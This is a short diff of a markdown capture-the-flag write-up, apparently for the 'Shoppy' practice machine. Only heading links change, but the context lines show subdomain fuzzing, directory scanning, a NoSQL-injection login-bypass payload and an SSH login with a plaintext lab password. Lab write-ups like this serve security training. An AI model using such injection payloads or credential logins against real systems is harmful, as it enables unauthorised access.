@@ -23,7 +23,7 @@ wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" \
 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 169
 ```
 
-### Feroxbuster
+### [Feroxbuster](HTTP)
 ```bash
 feroxbuster -u http://shoppy.htb
 ```
@@ -64,7 +64,7 @@ username=admin' || 1==1 //&password=123
 
 ---
 
-## 🔐 SSH Access
+## 🔐 [SSH](SSH) Access
 
 ```bash
 sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@shoppy.htb
